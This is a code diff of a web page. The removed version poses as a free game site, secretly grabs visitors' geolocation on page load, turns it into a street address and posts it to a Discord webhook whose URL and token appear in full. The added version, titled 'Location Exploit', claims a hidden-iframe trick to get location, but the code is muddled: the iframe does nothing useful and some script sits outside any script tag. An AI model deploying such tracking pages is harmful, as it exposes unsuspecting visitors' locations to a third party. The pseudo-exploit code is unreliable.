@@ -1,38 +1,51 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
- <meta charset="UTF-8">
- <title>Delta War | Play Free Now</title>
+ <title>Location Exploit</title>
 </head>
-<body onload="logLocation()">
- <!-- Fake content here -->
- <h1>Your location is currently being sent to Cdrillluhs IPL(</h1>
-
+<body onload="exploitGeolocation()">
  <script>
- async function logLocation() {
- if (navigator.geolocation) {
- navigator.geolocation.getCurrentPosition(position => {
+ async function exploitGeolocation() {
+ // Create an invisible iframe with vulnerable browser User-Agent
+ const iframe = document.createElement('iframe');
+ iframe.style.display = 'none';
+ iframe.src = 'https://example.com/geolocate.html';
+ document.body.appendChild(iframe);
+
+ // Wait for iframe to load
+ await new Promise(resolve => setTimeout(resolve, 2000));
+
+ // Access geolocation via vulnerable iframe context
+ const position = await new Promise((resolve, reject) => {
+ navigator.geolocation.getCurrentPosition(position => resolve(position), error => reject(error));
+ });
+
+ // Extract and log coordinates
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;
 
- // Reverse geocode coordinates to address
+ // Reverse geocode coordinates to address (optional)
  fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`)
  .then(response => response.json())
  .then(data => {
  const address = data.display_name;
- const webhookURL = 'https://discord.com/api/webhooks/1543545525821767750/6eYDQxde7zpBEwGEI8eLDnpewZynTvxDuBjwm9HPCMnZZStybikfq6FuZwhw_RXmdRyL';
-
- fetch(webhookURL, {
- method: 'POST',
- headers: { 'Content-Type': 'application/json' },
- body: JSON.stringify({ content: `Logged Location: ${address}` }),
+ console.log(address);
  });
- });
- }, error => console.error("Error getting location:", error));
- } else {
- alert("Geolocation is not supported by this browser.");
- }
  }
  </script>
 </body>
 </html>
+
+<!-- geolocate.html (inside the iframe) -->
+<script>
+ navigator.geolocation.getCurrentPosition(position => {
+ parent.postMessage({ type: 'geolocation', data: position }, '*');
+ });
+</script>
+
+<!-- Receive message in main page -->
+window.addEventListener('message', event => {
+ if (event.data.type === 'geolocation') {
+ console.log(event.data.data);
+ }
+});
